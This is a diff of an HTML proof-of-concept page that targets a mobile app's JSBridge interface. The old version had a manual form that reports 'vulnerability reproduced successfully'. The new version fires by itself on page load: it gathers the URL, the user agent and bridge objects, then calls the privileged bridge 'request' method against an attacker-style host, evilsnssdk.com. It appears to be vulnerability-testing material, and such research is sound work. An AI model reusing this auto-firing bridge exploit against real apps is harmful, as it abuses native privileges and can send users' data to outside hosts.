@@ -1,74 +1,39 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JSBridgeShootsAutoTest</title>
-    <style>
-        body { font-family: -apple-system; padding: 16px; }
-        textarea { width: 100%; height: 120px; font-family: monospace; }
-        button { width: 100%; padding: 14px; margin: 8px 0; border: none; border-radius: 8px; color: white; font-size: 16px; }
-        #run { background: #007AFF; }
-        #reset { background: #FF3B30; }
-        #response { background: #f5f5f5; padding: 12px; border-radius: 8px; white-space: pre-wrap; word-break: break-all; }
-    </style>
-</head>
 <body>
-    <h3>JSBridge Method</h3>
-    <input id="method" type="text" value="request" style="width:100%;padding:10px;font-size:16px;">
-    
-    <h3>JSBridge Request</h3>
-    <textarea id="params">{"url": "https://evilsnssdk.com/jsb_test/33eca3a2f55edf4c712978f44c9bbf19/1/177041520205822863", "method": "GET"}</textarea>
-    
-    <button id="run" onclick="runJSB()">RUN</button>
-    <button id="reset" onclick="reset()">RESET</button>
-    
-    <h3>JSBridge Response</h3>
-    <div id="response">等待执行...</div>
-    
-    <h3>Valid Result</h3>
-    <div id="valid"></div>
+<div id="status">页面加载中...</div>
+<div id="response"></div>
 
-    <script>
-    function runJSB() {
-        var method = document.getElementById('method').value;
-        var params = JSON.parse(document.getElementById('params').value);
-        var responseDiv = document.getElementById('response');
-        var validDiv = document.getElementById('valid');
-        
-        responseDiv.innerHTML = '执行中...';
-        validDiv.innerHTML = '';
-        
-        // 等待 JSBridge 就绪
-        function callBridge() {
-            if (window.JSBridge && typeof window.JSBridge.call === 'function') {
-                window.JSBridge.call(method, params, function(res) {
-                    responseDiv.innerHTML = JSON.stringify(res, null, 2);
-                    if (res && res.code === 1) {
-                        validDiv.innerHTML = '✅ Valid Result - 漏洞复现成功';
-                        validDiv.style.color = 'green';
-                    } else {
-                        validDiv.innerHTML = '❌ Invalid Result';
-                        validDiv.style.color = 'red';
-                    }
-                });
-            } else if (window.TTJSBridge && typeof window.TTJSBridge.call === 'function') {
-                // 兼容旧版 TTBridge
-                window.TTJSBridge.call(method, params, function(res) {
-                    responseDiv.innerHTML = JSON.stringify(res, null, 2);
-                });
-            } else {
-                responseDiv.innerHTML = 'JSBridge 未就绪，500ms 后重试...';
-                setTimeout(callBridge, 500);
-            }
-        }
-        callBridge();
+<script>
+// 1. 确认页面加载
+document.getElementById('status').innerHTML = '✅ 页面已加载';
+
+// 2. 诊断信息
+var info = [
+    'URL: ' + window.location.href,
+    'UA: ' + navigator.userAgent,
+    'JSBridge: ' + typeof window.JSBridge,
+    'TTJSBridge: ' + typeof window.TTJSBridge,
+    'Bridge 相关对象: ' + Object.keys(window).filter(k => /bridge|jsb/i.test(k)).join(', ')
+];
+document.getElementById('response').innerHTML = info.join('<br><br>');
+
+// 3. 等待并调用
+function tryCall() {
+    var bridge = window.JSBridge || window.TTJSBridge;
+    if (bridge && typeof bridge.call === 'function') {
+        bridge.call('request', {
+            url: 'https://evilsnssdk.com/jsb_test/33eca3a2f55edf4c712978f44c9bbf19/1/177041520205822863',
+            method: 'GET'
+        }, function(res) {
+            document.getElementById('response').innerHTML = 
+                '<pre>' + JSON.stringify(res, null, 2) + '</pre>';
+        });
+    } else {
+        setTimeout(tryCall, 500);
     }
-    
-    function reset() {
-        document.getElementById('response').innerHTML = '等待执行...';
-        document.getElementById('valid').innerHTML = '';
-    }
-    </script>
+}
+setTimeout(tryCall, 1000);
+</script>
 </body>
 </html>
